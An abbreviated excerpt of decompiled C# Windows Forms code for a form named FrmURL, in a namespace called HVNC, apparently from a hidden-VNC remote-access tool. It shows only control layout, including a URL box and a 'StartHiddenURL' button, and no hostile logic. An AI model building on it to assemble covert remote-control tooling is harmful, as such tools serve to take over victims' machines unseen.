...
namespace HVNC
{
  public class FrmURL : Form
  {
    ...
    public FrmURL() => this.InitializeComponent();
    ...
    private void InitializeComponent()
    {
      ...
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FrmURL));
      ...
      this.panel1.Size = new Size(530, 34);
      ...
      this.siticoneControlBox1.Location = new Point(503, 6);
      ...
      this.label18.Size = new Size(67, 20);
      ...
      this.StartHiddenURLbtn.Location = new Point(365, 123);
      ...
      this.Urlbox.Location = new Point(59, 123);
      ...
      this.MaximumSize = new Size(530, 211);
      this.MinimumSize = new Size(530, 211);
      this.Name = nameof (FrmURL);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (FrmURL);
